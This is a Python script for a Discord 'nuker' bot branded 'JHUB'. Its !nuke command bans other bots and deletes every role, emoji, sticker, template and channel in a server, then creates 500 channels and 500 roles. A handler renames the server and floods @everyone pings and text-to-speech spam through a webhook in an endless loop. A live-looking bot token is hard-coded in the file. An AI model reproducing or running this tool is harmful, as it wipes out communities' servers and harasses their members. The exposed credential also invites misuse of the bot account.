from discord.ext import commands
import discord
import asyncio

# Settings
prefix = "!"
channel_name = "nuked-by-jhub"
role_name = "nuked-by-jhub"
server_name = "NUKED BY JHUB"
webhook_name = "JHUB Nuker"
message = "💥 NUKED BY JHUB discord.gg/k7dfvnK7KK"
token = "MTQwNDI5ODE0NTM3ODIwOTc5Mg.GhIPDC.58_R7pNiHLqWHIYfmf9oBFo4s1L7wuLaLC3tqU" 

bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

@bot.event 
async def on_ready():
    print("Bot is ready.")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    tasks = []

    # Ban all bots (except this one)
    tasks.extend([member.ban(reason="Nuked by JHUB") for member in ctx.guild.members if member.bot and member != ctx.guild.me])

    # Delete all roles (except @everyone and top role)
    tasks.extend([role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role and role != ctx.guild.me.top_role])

    # Delete emojis & stickers
    tasks.extend([emoji.delete() for emoji in ctx.guild.emojis])
    tasks.extend([sticker.delete() for sticker in ctx.guild.stickers])

    # Delete templates
    if ctx.guild.templates:
        templates = await ctx.guild.templates()
        tasks.extend([template.delete() for template in templates])

    # Delete all channels
    tasks.extend([channel.delete() for channel in ctx.guild.channels])

    try:
        await asyncio.gather(*tasks)
    except Exception as e:
        print(f"Error during nuking: {e}")

    # Create 500 channels and roles
    create_tasks = []
    for _ in range(500):
        create_tasks.append(ctx.guild.create_text_channel(channel_name))
        create_tasks.append(ctx.guild.create_role(name=role_name))
    await asyncio.gather(*create_tasks)

@bot.command() 
async def check(ctx):
    guild = ctx.guild

    if guild:
        bot_member = guild.me
        if bot_member.guild_permissions.administrator:
            await ctx.send("✅ Bot has administrator permissions.")
        else:
            await ctx.send("❌ Bot does not have administrator permissions.")
    else:
        await ctx.send("This command can only be used in a server.")

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == channel_name:
        try:
            # Rename server
            await channel.guild.edit(name=server_name)

            # Create webhook
            webhook = await channel.create_webhook(name=webhook_name)

            while True:
                tasks = []
                for _ in range(10):
                    tasks.append(channel.send(f"@everyone @here\n{message}", tts=True))
                    tasks.append(webhook.send(f"@everyone @here\n{message}", tts=True))
                await asyncio.gather(*tasks)

        except discord.errors.Forbidden:
            print(f"Missing permissions in channel: {channel.name}")
        except Exception as e:
            print(f"Error in on_guild_channel_create: {e}")

bot.run(token)
